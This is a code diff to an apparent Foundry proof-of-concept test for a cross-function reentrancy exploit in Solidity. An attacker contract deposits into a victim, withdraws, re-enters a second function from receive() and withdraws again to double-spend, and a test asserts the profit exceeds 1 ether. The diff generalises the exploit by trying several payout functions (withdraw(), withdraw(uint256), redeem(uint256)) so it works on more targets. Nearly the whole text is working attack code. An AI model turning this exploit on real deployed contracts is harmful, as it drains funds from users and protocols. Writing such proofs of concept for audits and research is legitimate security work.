@@ -24,16 +24,31 @@ interface IVictim {
 contract CrossFunctionAttacker {
     IVictim public immutable victim;
     bool public reentered;
+    uint256 public depositAmount;
 
     constructor(address victim_) {
         victim = IVictim(victim_);
     }
 
     function attack() external payable {
+        depositAmount = msg.value;
         victim.deposit{value: msg.value}();
-        victim.withdraw();
+        _withdraw();
         // After the callback moved credit a second time, withdraw again.
-        victim.withdraw();
+        _withdraw();
+    }
+
+    /// Exit through whichever payout entry point the target exposes,
+    /// for the credited deposit amount: withdraw(), withdraw(uint256)
+    /// or redeem(uint256). The double-spend judging is unchanged — the
+    /// re-entry still goes through the SECOND function in receive().
+    function _withdraw() internal {
+        (bool ok,) = address(victim).call(abi.encodeWithSignature("withdraw()"));
+        if (ok) return;
+        (ok,) = address(victim).call(abi.encodeWithSignature("withdraw(uint256)", depositAmount));
+        if (ok) return;
+        (ok,) = address(victim).call(abi.encodeWithSignature("redeem(uint256)", depositAmount));
+        require(ok, "no payout entry point succeeded (tried withdraw(), withdraw(uint256), redeem(uint256))");
     }
 
     receive() external payable {
@@ -74,6 +89,10 @@ contract PoC is Test {
 
         uint256 profit = address(attacker).balance - attackerBefore;
         console.log("attacker profit:", profit);
-        assertGt(profit, 1 ether, "exploit did not reproduce: no double-spend via second function");
+        assertGt(
+            profit,
+            1 ether,
+            "exploit did not reproduce: no double-spend via second function. Tried withdraw()/withdraw(uint256)/redeem(uint256) as the payout entry points."
+        );
     }
 }
